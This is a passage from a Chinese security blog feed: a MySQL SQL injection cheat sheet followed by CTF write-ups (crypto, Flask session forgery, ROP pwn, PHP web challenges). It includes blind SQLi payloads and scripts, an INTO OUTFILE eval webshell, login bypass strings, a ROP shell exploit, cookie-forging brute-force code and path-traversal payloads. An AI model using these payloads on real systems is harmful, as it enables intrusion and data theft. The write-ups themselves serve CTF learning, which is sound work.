information_schema.tables limit 1)&lt;=128)) 报错注入盲注盲注场景在许多情况下，通过前面的测试会发现页面没有回显提取的数据，但是根据语句是否执行成功与否会有一些相应的变化。 正确/错误的语句使得页面有适度的变化。可以尝试使用布尔注入 正确语句返回正常页面，错误的语句返回通用错误页面。可以尝试使用布尔注入。 提交错误语句，不影响页面的正常输出。建议尝试使用延时注入。 几种简单的判断语句，在真实利用中需要根据情况而变化: CASE IF() IFNULL() NULLIF() 布尔盲注-基于响应提交一个逻辑判断语句，来推断一个个的信息位。由于注入需要（一般）一个个字符的进行，所以需要利用脚本，或者工具（比如burp suite）。以下是： payload12345678910111213141516// i 用于提取每一个位，j 用于判断其对应的ASCII码值的范围。// k ，结合limit，选择偏移为k的行// **中可以填上其他的select语句，比如查询表名，列名，数据。一次类推。// SUBSTR() 也可以换成 SUBSTRING()&apos; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #&apos; OR (SELECT ASCII(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) ) &lt; j) # &apos; OR (SELECT SUBSTR(DATABASE(),i,1) &lt; j) #&apos; OR (SELECT SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j) # &apos; OR SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,1),i,1) &lt; j #... 脚本脚本利用，可见：ctf盲注利用脚本要点： 注意编码问题 注意异常处理 注意边界处理 延时盲注-基于时间一般会用到几个函数。使用这些的效果，是为了延缓mysql的操作，从而检测到与平时有异的情况： SLEEP(n) 让mysql停n秒钟 BENCHMARK(count,expr) 重复countTimes次执行表达式expr 一些注意事项： 使用基于时间的盲注比较不准确，因为这还取决于当前的网络环境。 时间延缓最好不要超过30秒，否则容易导致mysql的API连接超时。 当在页面上看不到任何明显变化时，再考虑选择使用延时注入。 检测方法1234561 OR SLEEP(25)=0 LIMIT 1 #1) OR SLEEP(25)=0 LIMIT 1 #1&apos; OR SLEEP(25)=0 LIMIT 1 #&apos;) OR SLEEP(25)=0 LIMIT 1 #1)) OR SLEEP(25)=0 LIMIT 1 #SELECT SLEEP(25) # payload123456UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)... 宽字节注入原理有如下php代码：12345...mysql_query("SET NAMES 'gbk'");....$name = isset($_GET['name']) ? addslashes($_GET['name']) : 1;$sql = "SELECT * FROM test WHERE names='&#123;$name&#125;'"; addslashes()会在单引号或双引号前加上一个\。当mysql使用GBK字符集时，会把两个字符当作一个汉字，如%df%5c为運字。我们输入name=root%df%27，%在服务器端会出现如下转换：root%df%27 -&gt; root%df%5c%27 -&gt; root運&#39;。 更多内容可见：浅析白盒审计中的字符编码及SQL注入 payload吃掉\1234index.php?name=1%df&apos;index.php?name=1%a1&apos;index.php?name=1%aa&apos;... 在被addslashes后，出现%XX%5c，当前一个字符的ascii码值大于128时，会被认为是一个宽字符，即使它不是个汉字。所以不是仅仅%df可以吃掉’\‘。 利用\1index.php?name=%**%5c%5c%27 二次注入文件读写利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。查询用户读写权限：1SELECT file_priv FROM mysql.user WHERE user = &apos;username&apos;; load_file()读取条件 需要有读取文件的权限 需要知道文件的绝对物理路径。 要读取的文件大小必须小于 max_allowed_packet 1SELECT @@max_allowed_packet; payload直接使用绝对路径,注意对路径中斜杠的处理。12345UNION SELECT LOAD_FILE(&quot;C://TEST.txt&quot;) #UNION SELECT LOAD_FILE(&quot;C:/TEST.txt&quot;) #UNION SELECT LOAD_FILE(&quot;C:\\TEST.txt&quot;) # 使用编码123UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) # select导出条件 一般要指定绝对路径 需导出的目录有可写权限 要outfile出的文件不能已经存在 payload123UNION SELECT DATABASE() INTO OUTFILE &apos;C:\\phpstudy\\WWW\\test\\1&apos;;UNION SELECT DATABASE() INTO OUTFILE &apos;C:/phpstudy/WWW/test/1&apos;; 写入webshell条件 需要知道网站的绝对物理路径，这样导出后的webshell可访问 对需导出的目录有可写权限。 payload1UNION SELECT &quot;&lt;?php eval($_POST[&apos;chybeta&apos;])?&gt;&quot; INTO OUTFILE &apos;C:/phpstudy/WWW/test/webshell.php&apos;; 万能密码后台登陆 admin’ — admin’ # admin’/* or ‘=’ or ‘ or 1=1— ‘ or 1=1# ‘ or 1=1/* ‘) or ‘1’=’1— ‘) or (‘1’=’1— PDO堆查询绕过技巧请见：WAF Bypass:SQL Injection sqlmap-tamper编写版本特性 mysql5.0以后 information.schema库出现 mysql5.1以后 udf 导入xx\lib\plugin\ 目录下 mysql5.x以后 system执行命令 常见sql注入位置 常见GET、POST参数 登陆框 http头 工具自动sql注入测试 sqlmap Pangolin 啊D 辅助工具 Burp Suite firefox::HackBar 参考 MySQL_Testing_Injection MySQL SQL Injection Cheat Sheet SQL Injection Cheat Sheet 独自等待：MySQL注入总结]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Meenpwn-2017-crypto-writeup]]></title>
      <url>%2F2017%2F07%2F19%2FMeenpwn-2017-crypto-writeup%2F</url>
      <content type="text"><![CDATA[Meenpwn-2017-crypto-writeup Simpler than RSA?题目12&quot;RSA is just math&quot;. And now, there is a cryptosystem that simpler than RSA, but, &quot;Simple is the Best!&quot;simple.py pubkey.txt enc.txt simple.py：1234567891011121314151617181920212223from Crypto.Util.number import *import randomfrom flag import FLAGdef generate(nbits): p = getPrime(nbits) q = getPrime(nbits) n = p * q * p g = random.randint(1, n) h = pow(g, n, n) return (n, g, h)def encrypt(m, n, g, h): r = random.randint(1, n) c = pow(pow(g, m, n) * pow(h, r, n), 1, n) return cm = [ord(char) for char in FLAG]n, g, h = generate(90)open("pubkey.txt", "w").write("&#123;0&#125;:&#123;1&#125;:&#123;2&#125;".format(n, g, h))c = [encrypt(mi, n, g, h) for mi in m]open("enc.txt", "w").write(str(c)) enc.txt和pubkey.txt就不直接贴出来了。 思路前期分析先对题目进行一下分析。目前已知123n = 1235280093599323856390922798440377476467763531842392869674688408727824382702235317g = 1110549711091392805024587195974719739929628997819528005374351081843256209971586072h = 610466084395822279908554174354632326166097007218620288020807622478449585661028278 密文c也已知。由simply.py知道： c = [(g^{m}\mod n)\times(h^{r}\mod n )]\mod n可以推出： c\equiv(g^{m}\times h^{r}) \mod n其中的r是未知的，我们要想办法消去它。 继续分析。n = p q p，其中q，p均为质数，拿到factordb上分解出：12p = 1057817919251064684989791981q = 1103935256393984899021164397 引理参考：The smallest solution of a^x = 1 mod m with (a,m) = 1，这边简要记录。假设正整数n是满足下列同余式的最小正整数，并且a和m互质： a^{n}\equiv 1\mod m由欧拉定理，有如下同余式。其中φ(m)是m的欧拉函数，表示小于m的与m互质的正整数的个数。 a^{φ(m)}\equiv 1\mod m现在假设$φ(m)=n\times{q}+r$，其中n的意义同上，q为商，r为余数。则欧拉定理可以改写为： a^{n\times{q}+r}\equiv 1\mod m又因为$ a^{n\times{q}}\equiv 1\mod m $（这是n的性质），所以有： a^{r}\equiv 1\mod m因为r&lt;n，而n是使同余式成立的最小正整数，所以必有r=0。所以接下去推导有： a^{q}\equiv 1\mod m结论回到本题中，$n={p}^{2}\times{q}$，接下来我们考虑n的欧拉函数φ(n)。因为： 所以： φ(n) = φ(p^{2}) \times φ(q)因为： 所以： φ(p^{2}) = (p-1) \times (p^{2-1}) = (p-1) \times pφ(q) = (q-1) \times (q^{1-1}) = q-1所以对φ(n)，有如下等式成立： φ(n) = p \times {(p-1)} \times {(q-1)}我们想要消去r，所以对h进行考虑，h和n互质，现在我们要找到φ(n)的一个分解因子k，使得根据引理，有$h^{k} \equiv 1 \mod n$。选择k=(p-1)*(q-1)恰好满足。 所以有： h^{(p-1)\times{(q-1)}}\equiv{1}\mod{n}也即： h^{(p-1)\times{(q-1)}\times{r}}\equiv{1^{r}}\mod{n}在$ c\equiv(g^{m}\times h^{r}) \mod n $同时加上(p-1)*(q-1)次方。可以推得： c^{(p-1)\times(q-1)} \equiv g^{m \times (p-1) \times (q-1)} \mod n其中m是明文的每一个字符，是可显的，范围为从32~126。可以对其进行爆破。 exp12345678910111213141516n = 1235280093599323856390922798440377476467763531842392869674688408727824382702235317g = 1110549711091392805024587195974719739929628997819528005374351081843256209971586072h = 610466084395822279908554174354632326166097007218620288020807622478449585661028278p = 1057817919251064684989791981q = 1103935256393984899021164397tphi = (p-1)*(q-1)ciper = [...太长省略...]flag = ''for c in ciper: temp = pow(c,tphi,n) for f in range(32,127): if temp == pow(g,f*tphi,n): flag += chr(f)print(flag) 题目涉及文件：链接：http://pan.baidu.com/s/1qYTsJjY 密码：rnw7 nub_cryptosystem12Quan is a nub-boi at Cryptography, but his dream is having an unbreakable cryptosystem. Could you prove him that &quot;nub is always nub&quot; by breaking his &apos;nub_cryptosystem&apos;?nub_cryptosystem.py pubkey.txt enc.txt justpad|\/|/-\T|-|Freedom Curve]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CTFZone-2017-Leaked messages-writeup]]></title>
      <url>%2F2017%2F07%2F19%2FCTFZone-2017-Leaked-messages-writeup%2F</url>
      <content type="text"><![CDATA[CTFZone-2017-Leaked messages-writeup1234One of our candidates used to send restricted data to colleagues via this servicebecause it&apos;s free and easy to use.Try to get some secrets which can compromise them.82.202.204.104 先注册一个账号，登陆 御剑扫出目录：http://82.202.204.104/backup/ 看文件，猜测是git泄露。用lijiejie的Githack只能下载到文件，没办法git log，而rip-git.pl提示说[!] No more items to fetch. That&#39;s it!，所以最后使用的工具是GitTools，不过如果直接用的话，会提示说没有找到.git目录，可以先将gitdumper.sh中以下代码去掉：1234if [[ ! &quot;$BASEURL&quot; =~ /.git/$ ]]; then echo -e &quot;\e[31m[-] /.git/ missing in url\e[0m&quot;; exit 0;fi 执行命令:1/gitdumper.sh http://82.202.204.104/backup/ dumper_LeakMessages 之后查看git log，如下命令,其中--no-paper禁用paper分页，发现有flag.txt：1git --no-pager log -p -1 得到如下结果： 123&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b32decode(&quot;MN2GM6TPNZSXW63IOR2HA4Z2F4XXS33VOR2WEZJOMNXW2L3XMF2GG2B7OY6UOMKJMJJHK2TLN4WUC7L5&quot;)&apos;ctfzone&#123;&#123;https://youtube.com/watch?v=G1IbRujko-A&#125;&#125;&apos; 可惜，这是个假的flag。接下来利用extractor.sh 将历次commit的内容恢复出来。1../Extractor/extractor.sh dumper_LeakMessages/ extra_Leakmessages 目录结构123456789101112131415161718192021222324252627282930313233343536373839404142├── 0-bd55b19e5413ce609d3bc4429c3a6f272341988a│ ├── commit-meta.txt│ ├── config.pyc│ ├── requirements.txt│ └── templates│ ├── index.html│ ├── login.html│ ├── messages.html│ └── register.html├── 1-8b1084b23d869e5dc1ae4ac845589ecfb896c0c3│ ├── commit-meta.txt│ ├── requirements.txt│ ├── static│ │ ├── css│ │ │ ├── bootstrap.min.css│ │ │ ├── login.css│ │ │ ├── main.css│ │ │ └── material-input.css│ │ ├── flag.txt│ │ └── js│ │ └── bootstrap.min.js│ └── templates│ ├── index.html│ ├── login.html│ ├── messages.html│ └── register.html└── 2-9f848cceeba31da2cbd2c8ecaebb8a8dab17eee4 ├── commit-meta.txt ├── requirements.txt ├── static │ ├── css │ │ ├── bootstrap.min.css │ │ ├── login.css │ │ ├── main.css │ │ └── material-input.css │ └── js │ └── bootstrap.min.js └── templates ├── index.html ├── login.html ├── messages.html └── register.html 先读取一下requirements.txt，知道是flask应用。123cat requirements.txtflaskflask_recaptcha 其中的config.pyc是其配置文件。利用uncompyle6进行反汇编：1234567891011121314151617181920root@chybeta:~/test# uncompyle6 config.pyc# uncompyle6 version 2.11.2# Python bytecode 3.6 (3379)# Decompiled from: Python 2.7.13 (default, Jan 19 2017, 14:48:08)# [GCC 6.3.0 20170118]# Embedded file name: config.py# Compiled at: 2017-07-15 01:28:42# Size of source mod 2**32: 288 bytesclass BaseConfig(object): DEBUG = False SECRET_KEY = &apos;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&apos; DB_NAME = &apos;messages.db&apos; RECAPTCHA_ENABLED = True RECAPTCHA_THEME = &apos;dark&apos; RECAPTCHA_TYPE = &apos;image&apos; RECAPTCHA_SIZE = &apos;normal&apos; RECAPTCHA_RTABINDEX = 10# okay decompiling config.pyc SECRET_KEY用于生成flask session。可以用Flask Session Cookie Decoder/Encoder进行解密。比如前面用burp抓包得到的session：1session=eyJudW1iZXIiOiIzMjY0MTAwMzE3MjYiLCJ1c2VybmFtZSI6ImNoeWJldGEifQ.DFBD8w.f5sHhO4vBngV-EtNRMOPw28PFkA 对其进行解密：12root@chybeta:~/flask-session-cookie-manager# python session_cookie_manager.py decode -c &quot;eyJudW1iZXIiOiIzMjY0MTAwMzE3MjYiLCJ1c2VybmFtZSI6ImNoeWJldGEifQ.DFBD8w.f5sHhO4vBngV-EtNRMOPw28PFkA&quot; -s &quot;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&quot; &#123;u&apos;username&apos;: u&apos;chybeta&apos;, u&apos;number&apos;: u&apos;326410031726&apos;&#125; 现在我们就可以利用这个脚本来伪造cookie了，比如：123root@chybeta:~/flask-session-cookie-manager# python session_cookie_manager.py encode -s &apos;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&apos; -t &apos;&#123;&quot;username&quot;:&quot;chybeta&quot;,&quot;number&quot;:&quot;326410031725&quot;&#125;&apos;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOekkxIn0sInVzZXJuYW1lIjp7IiBiIjoiWTJoNVltVjBZUT09In19.DEh3qQ.yq3ZCE5Mpoy74D9e3wkfbbenU1E 现在我们利用下面这个脚本，来获取admin的各条信息，number的上下限是通过测试出来的。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# standard importsimport sysimport zlibimport astimport requestsfrom itsdangerous import base64_decodefrom flask.sessions import SecureCookieSessionInterfaceimport sysreload(sys)sys.setdefaultencoding('utf-8')class MockApp(object): def __init__(self, secret_key): self.secret_key = secret_keydef session_cookie_encoder(secret_key, session_cookie_structure): try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return "[Encoding error]&#123;&#125;".format(e)if __name__ == "__main__": number_min = 326410000000 number_max = 326410030240 for number in range(number_min,number_max): file_message = open("message.txt",'w') secret_key = ".&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d" cookie_structure = "&#123;'username':'admin','number':"+ str(number) + "&#125;" session = session_cookie_encoder(secret_key, cookie_structure) cookie = &#123;'session':session&#125; url = "http://82.202.204.104/messages" content = requests.get(url,cookies=cookie) start_index = content.text.find('&lt;span class="message"&gt;')+len('&lt;span class="message"&gt;') end_index = content.text.find('&lt;/span&gt;\n &lt;/div&gt;\n &lt;/body&gt;\n&lt;/html&gt;') if "You have no messages yet" not in content.text: print number file_message.writelines(str(number)+":"+str(content.text[start_index:end_index])) else: continuefile_message.close() 在message.txt中查找：12root@chybeta:~/flask-session-cookie-manager# cat message.txt | grep &quot;http&quot;It&amp;#39;s so cool! https://postimg.org/image/41t4h680r/ 得到flag：1ctfzone&#123;b1d4207ff1965105af775cfa71d8214d&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN选拔赛-2017-misc-writeup]]></title>
      <url>%2F2017%2F07%2F17%2FXMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup%2F</url>
      <content type="text"><![CDATA[XMAN选拔赛-2017-misc-writeup Pretty_Cat12好可爱的喵附件下载 strings看一下：123456root@chybeta:~/Desktop# strings e539200b-6833-4ff1-96b8-11bff3e1e740.jpgJFIFpExifWE1BTntVNWU=XzN4MWZ0b28xfQ== , #&amp;&apos;)*) 对两个base64加密串进行解密并拼接。得到flag：1XMAN&#123;U5e_3x1ftoo1&#125; FlagFlagFlag1234Anyone wants to get flag?hint1 : https://pan.baidu.com/s/1bSiQbOhint2 : Pkcrack Pdf_Hack]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN选拔赛-2017-pwn-writeup]]></title>
      <url>%2F2017%2F07%2F16%2FXMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup%2F</url>
      <content type="text"><![CDATA[XMAN选拔赛-2017-pwn-writeup。 Raaa12Are you ok? Do you like mifan?nc challenges.xctf.org.cn 14005 太简单。rand()。1234567#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void)&#123; int a = rand() ^ 590558003; printf("%d\n", a); return 0;&#125; 得到1220048468，输入。1234(venv) chybeta@ubuntu:~/pwn/ctf/XMAN2017/pwn/Raaa$ nc challenges.xctf.org.cn 140051220048468XMAN&#123;Have_y0u_ever_heard_of_AnLi,my_fr1end?&#125;heiheiehi! Baaa12If you give me three days light。nc challenges.xctf.org.cn 14002 没给程序：）。好吧google大法好。发现是16年CSAW-warmup原题。https://www.megabeets.net/csaw-2016-pwn-warmup-writeup/ flag:1XMAN&#123;Ba1a1a_Xiao_Mo_Xian,BianBIanBian&#125; Caaa1234一心想学bin的张日天报名了xman，开学的时候老师让大家自我介绍：老师（手上拿着名单册子）：好，下一位，请*言简意赅*的介绍自己nc challenges.xctf.org.cn 14000 很明显的栈溢出，64位rop。溢出点用pattern生成后，在gdb中x/gx $rsp查看再带回pattern即可求出偏移为40。要是直接看IDA的话，buf的位置在bp-20h，0x20+8=40，也确实是40个字节。 123456789101112131415161718192021from pwn import *p = process("./2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin")# p = remote("challenges.xctf.org.cn","14000")elf = ELF("./2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin")system_addr = elf.symbols['system']pop_rdi_ret = 0x0000000000400973sh_addr = next(elf.search('/bin/sh\x00'))offset = 40p.recv()p.sendline("1")p.recv()payload = 'a' * offsetpayload += p64(pop_rdi_ret)payload += p64(sh_addr)payload += p64(system_addr)p.sendline(payload)p.interactive() 1234567891011121314(venv) chybeta@ubuntu:~/pwn/ctf/XMAN2017/pwn/Caaa$ python exp.py[+] Opening connection to challenges.xctf.org.cn on port 14000: Done[*] &apos;/home/chybeta/pwn/ctf/XMAN2017/pwn/Caaa/2ddf143c-dd2f-4ce0-9409-9e8f72f5364a.bin&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE[*] Switching to interactive mode1your name is:hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaas @!$ cat /home/xman/flagxman&#123;Welcome_to_bin_world!&#125;$ 剩下的pwn题，好像都是跟堆有关的。还不会，暂时就不写了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN选拔赛-2017-web-writeup]]></title>
      <url>%2F2017%2F07%2F16%2FXMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup%2F</url>
      <content type="text"><![CDATA[XMAN选拔赛-2017-web-writeup 都是基础题目 variacover123456789101112131415161718&lt;meta charset="utf-8"&gt;&lt;?phperror_reporting(0);if (empty($_GET['b'])) &#123; show_source(__FILE__); die();&#125;else&#123; include('flag.php');$a = "www.XMAN.com";$b = $_GET['b'];@parse_str($b);if ($a[0] != 'QNKCDZO' &amp;&amp; md5($a[0]) == md5('QNKCDZO')) &#123; echo $flag;&#125;else&#123;exit('你的答案不对0.0');&#125;&#125;?&gt; parse_str变量覆盖漏洞，和php弱类型比较问题。 1http://challenges.xctf.org.cn:7771/?b=a[0]=240610708 得到flag：1XMAN&#123;A_sTr_covcderd_t3st_you_oW?&#125; urldecode 改为XMAN后提示urldecode： 考点应该是类似二次注入类型，将XMAN进行一次urlencode，再把其中的%替换为%25，最后的payload：1http://challenges.xctf.org.cn:7772/?me=%2558%254d%2541%254e 得到flag1XMAN&#123;UrlDeCode_CooL_yOu_u0D3rSta9D! upload比赛时没做这题。.htaccess。先自己新建一个文件.htaccess，内容如下：123&lt;FilesMatch &quot;_chybeta.gif&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 然后现在要上传跟我说已经exist了。好吧GG。比赛结束后没人维护了。 unserialize访问：1http://challenges.xctf.org.cn:7774/?code=1 得到hint: flag.php。访问：1http://challenges.xctf.org.cn:7774/flag.php 得到hint2: help.php1http://challenges.xctf.org.cn:7774/help.php 得到hint3：1class FileClass&#123; public $filename = &apos;error.log&apos;; public function __toString()&#123; return file_get_contents($this-&gt;filename); &#125; &#125; 知道是反序列化问题，用下面代码生成：1234567891011&lt;?phpclass FileClass&#123; public $filename = 'error.log'; public function __toString()&#123; return file_get_contents($this-&gt;filename); &#125;&#125;$chybeta = new FileClass();$chybeta-&gt;filename = 'flag.php';echo serialize($chybeta); 访问：1http://challenges.xctf.org.cn:7774/?code=O:9:&quot;FileClass&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125; 最后flag1XMAN&#123;UUNser1AL1Z3_XMAN__0)(0&#125; 这题源码：index.php123456789101112131415161718192021222324&lt;?phpif(empty($_GET['code']))&#123;exit('?code=');&#125;class FileClass&#123; public $filename = 'error.log'; public function __toString()&#123; return file_get_contents($this-&gt;filename); &#125;&#125;class User&#123; public $age = 0; public $name = ''; public function __toString() &#123; return 'User ' . $this-&gt;name . ' is ' . $this-&gt;age . ' years old. &lt;br /&gt;'; &#125; &#125;echo "hint: flag.php";$obj = unserialize($_GET['code']);echo $obj;?&gt; PHP扫到index.php~，源码如下：12345678910111213141516171819202122232425262728293031323334353637&lt;?php$a=0;$b=0;$c=0;if (isset($_GET['aaa']))&#123; $aaa = $_GET['aaa']; $aaa=="1"?die("Emmm..."):NULL; switch ($aaa) &#123; case 0: case 1: $a=1; break; &#125;&#125;$bbb=(array)json_decode(@$_GET['bbb']);if(is_array($bbb))&#123; is_numeric(@$bbb["ccc"])?die("Emmm..."):NULL; if(@$bbb["ccc"])&#123; ($bbb["ccc"]&gt;2017)?$b=1:NULL; &#125; if(is_array(@$bbb["ddd"]))&#123; if(count($bbb["ddd"])!==2 OR !is_array($bbb["ddd"][0])) die("Emmm..."); $eee = array_search("XMAN", $bbb["ddd"]); $eee===false?die("Emmm..."):NULL; foreach($bbb["ddd"] as $key=&gt;$val)&#123; $val==="XMAN"?die("Emmm..."):NULL; &#125; $c=1;&#125;&#125;if($a &amp;&amp; $b &amp;&amp; $c)&#123; include "flag.php"; echo $flag;&#125;?&gt; 考察php弱类型。payload如下：1http://challenges.xctf.org.cn:8004/index.php?aaa=1abcdef&amp;bbb=&#123;&quot;ccc&quot;:&quot;2018a&quot;,&quot;ddd&quot;:[[1],0]&#125; 得到flag：1XMAN&#123;PHP_IS_THE_BEST_LANGUAGE&#125; downloaded用admin登陆后发现是Codiad 2.5.3，exploit-db上找到poc1https://www.exploit-db.com/exploits/36371/ 找flag的位置花了一点时间。最后paylaod:1http://challenges.xctf.org.cn:7775/components/filemanager/download.php?path=../../../../../../../../../../../var/www/flag.txt&amp;type=undefined 1XMAN&#123;D0WnL0D_3v3RYTh1ng_You_Win&#125; springCVE-2017-4971：Spring WebFlow漏洞。到处找poc。 1XMAN&#123;UGhoiXoeDae6zeethaxoh1eex3xeiJ7y&#125; 参考：https://github.com/Medicean/VulApps/tree/master/s/springwebflow/1 CTF用户登录在登陆处存在注入，登陆成功与否加载了html标签前，直接用浏览器看是看不到的不会解析。经过fuzz，可以知道过滤了逗号，空格等，但union select，substr，and，or，单引号，#没有过滤。 逗号被过滤，可以用以下方式绕过： 123mid(user() from 1 for 1)或substr(user() from 1 for 1) 空格被过滤，可以用tab键绕过，其url编码为%09 所以这题就是盲注，下面附上python脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596# -*- coding:utf-8 -*-import requestsimport stringimport sysglobal findBitdef sendPayload(payload): proxy = &#123;"http":"http://127.0.0.1:8080"&#125; url = "http://challenges.xctf.org.cn:8003/login.php" headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125; parm = "username="+payload+"&amp;password=bb&amp;submit=" content = requests.post(url,data=parm,headers=headers,proxies=proxy) return content.textcuowu = '\u9519\u8bef'.decode('unicode_escape')def generateTarget(flag): if flag == "database": return "database()" elif flag == "tables": return "(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x786d616e)" elif flag == "columns": return "(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x6374665f7573657273)" elif flag == "data": return "(SELECT%09GROUP_CONCAT(gpass%09SEPARATOR%090x3c62723e)%09FROM%09ctf_users)"def doubleSearch(leftNum,rightNum,i,target): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): payload = "a'%09or%09(%09select%09ascii(substr("+generateTarget(target) +"%09from%09"+ str(i) +"%09for%091))&lt;="+str(midNum) +")%23" # print payload recv = sendPayload(payload) # print recv if cuowu in recv: # print 'cuowu' # raw_input() doubleSearch(midNum,rightNum,i,target) else: # print 'chenggong' # raw_input() doubleSearch(leftNum,midNum,i,target) else: if rightNum != 0: # print rightNum # raw_input() sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): global findBit i = 1 findBit = 0 print "The database:" target = "database" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The tables:" target = "tables" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The columns:" target = "columns" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") break i = 1 findBit = 0 print "The data:" target = "data" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakexp() 最后flag：1XMAN&#123;DO_you_l1ke_sqlmap_sqlmap&#125; 倾听世界的声音XSS，还没开始研究。膜拜大佬。 参考：http://www.cnblogs.com/zaki-Gui/p/7115821.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Meenpwn-2017-web-writeup]]></title>
      <url>%2F2017%2F07%2F16%2FMeenpwn-2017-web-writeup%2F</url>
      <content type="text"><![CDATA[考点：反序列化，rand，sql注入 TSULOTT通过查看源代码，可以发现hint，得到源码，这里只贴重点部分。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;body&gt;&lt;?phpclass Object&#123; var $jackpot; var $enter;&#125;?&gt;&lt;?phpinclude('secret.php');if(isset($_GET['input'])) &#123; $obj = unserialize(base64_decode($_GET['input'])); if($obj) &#123; $obj-&gt;jackpot = rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99); if($obj-&gt;enter === $obj-&gt;jackpot) &#123; echo "&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;CONGRATULATION! You Won JACKPOT PriZe !!! &lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;". "&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white' size='20'&gt;".$obj-&gt;jackpot."&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"; echo "&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='green' size='25'&gt;".$flag."&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;&lt;br&gt;"; echo "&lt;center&gt;&lt;img src='http://www.relatably.com/m/img/cross-memes/5378589.jpg' /&gt;&lt;/center&gt;"; &#125; else &#123; echo "&lt;br&gt;&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;Wrong! True Six Numbers Are: &lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;". "&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white' size='25'&gt;".$obj-&gt;jackpot."&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;&lt;br&gt;"; &#125; &#125; else &#123; echo "&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;- Something wrong, do not hack us please! -&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"; &#125;&#125;else&#123; echo "";&#125;?&gt;&lt;center&gt;&lt;br&gt;&lt;h2&gt;&lt;font color='yellow' size=8&gt;-- TSU&lt;/font&gt;&lt;font color='red' size=8&gt;LOTT --&lt;/font&gt;&lt;/h2&gt;&lt;p&gt;&lt;p&gt;&lt;font color='white'&gt;Input your code to win jackpot!&lt;/font&gt;&lt;p&gt;&lt;form&gt; &lt;input type="text" name="input" /&gt;&lt;p&gt;&lt;p&gt; &lt;button type="submit" name="btn-submit" value="go"&gt;send&lt;/button&gt;&lt;/form&gt;&lt;/center&gt;&lt;?phpif (isset($_GET['gen_code']) &amp;&amp; 